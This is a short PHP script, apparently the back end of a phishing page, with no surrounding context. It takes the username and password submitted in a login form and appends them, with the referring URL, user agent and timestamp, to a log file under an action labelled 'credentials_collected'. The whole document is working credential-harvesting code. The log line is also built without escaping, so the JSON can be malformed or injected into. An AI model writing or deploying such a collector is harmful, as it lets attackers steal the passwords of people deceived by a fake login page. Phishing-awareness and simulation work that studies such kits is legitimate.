<?php
$myfile = fopen("/tmp/urlinput.log", "a", true) or die("Unable to open file!");
$user = $_POST["user"];
$password = $_POST["password"];
$urlpath = $_SERVER["HTTP_REFERER"];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('m/d/Y H:i:s');
$logentry = '{"timestamp":"'.$timestamp.'","action":"credentials_collected","user":"'.$user.'","password":"'.$password.'","urlpath":"'.$urlpath.'","useragent":"'.$useragent.'"}';
fwrite($myfile, $logentry);
fwrite($myfile, "\r\n");
fclose($myfile);
?>
